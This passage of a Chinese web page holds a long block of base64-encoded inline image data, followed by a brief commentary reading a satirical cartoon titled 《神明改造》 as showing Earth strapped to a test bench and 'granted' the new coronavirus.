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" alt="500"  /></p><center>《神明改造》</center><p>​    又是一个充满了深意的讽刺漫画，既然作品叫做《神明改造》第一个问题就来了：谁是神明？谁能改造神明？漫画下方的注释如此写到，I grant you a new corona。对于这个解法我更认为是字对字的直译，我授予你新冠。被牢牢锁在试验台上的巨人正是地球，地球就是这个讽刺漫画所指的神。</p><p>​    